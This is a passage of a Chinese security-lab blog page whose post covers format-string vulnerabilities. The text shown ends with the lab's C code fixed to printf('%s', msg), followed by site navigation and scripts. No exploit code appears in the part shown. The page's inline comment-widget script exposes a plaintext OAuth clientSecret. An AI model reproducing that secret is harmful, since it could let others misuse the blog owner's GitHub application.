framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq %%rbp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.16lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the ebp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,msg); <span class="comment">// &lt;===== 这里原来是printf(&quot;msg&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样用户就不能控制格式化字符串，只能控制参数。从而让用户失去了对栈操作的权力。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/04/14/input_check_lab/">software-security-lab3</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-04-14, 08:27:47</p>
+        <p><span>最后更新:</span>2023-01-19, 12:56:44</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/04/14/input_check_lab/" title="software-security-lab3">https://nicholas-wei.github.io/2022/04/14/input_check_lab/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2022/04/14/input_check_lab/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/04/15/hackpark2022-shiftycode/">
+                    hackpark2022_shiftycode
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/04/07/software-security-lab2/">
+                    software-security-lab2
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#input-check-lab"><span class="toc-number">1.</span> <span class="toc-text">input check lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#printf%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">printf的实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.1.1.</span> <span class="toc-text">格式化字符串漏洞成因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task1-crash"><span class="toc-number">1.2.</span> <span class="toc-text">task1 crash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task2"><span class="toc-number">1.3.</span> <span class="toc-text">task2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#partA"><span class="toc-number">1.3.1.</span> <span class="toc-text">partA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#partB"><span class="toc-number">1.3.2.</span> <span class="toc-text">partB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task3"><span class="toc-number">1.4.</span> <span class="toc-text">task3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#part1"><span class="toc-number">1.4.1.</span> <span class="toc-text">part1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#part2"><span class="toc-number">1.4.2.</span> <span class="toc-text">part2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#part3"><span class="toc-number">1.4.3.</span> <span class="toc-text">part3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task4"><span class="toc-number">1.5.</span> <span class="toc-text">task4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#question1"><span class="toc-number">1.5.1.</span> <span class="toc-text">question1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#question2"><span class="toc-number">1.5.2.</span> <span class="toc-text">question2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5shellcode"><span class="toc-number">1.5.3.</span> <span class="toc-text">注入shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x64"><span class="toc-number">1.6.</span> <span class="toc-text">x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fix-the-problem"><span class="toc-number">1.7.</span> <span class="toc-text">fix the problem</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"software-security-lab3　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/04/15/hackpark2022-shiftycode/" title="上一篇: hackpark2022_shiftycode">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/04/07/software-security-lab2/" title="下一篇: software-security-lab2">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
